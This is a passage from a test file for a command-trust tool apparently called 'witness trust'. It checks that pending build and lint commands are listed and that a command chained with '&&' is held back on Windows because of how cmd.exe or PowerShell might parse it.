    expect(pendingCmds(r.value)).toContain('npm test && npm run lint')
    expect(pendingRows(r.value, 'win32')).toEqual([
      'note: npm test && npm run lint — not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read ' +
        'as more than text · at a terminal, witness trust ingest-plan-1 asks for each command',
      "run: witness trust ingest-plan-1 --cmd 'pnpm lint'",
      "run: witness trust ingest-plan-1 --cmd 'echo first'",
    ])
  })
})
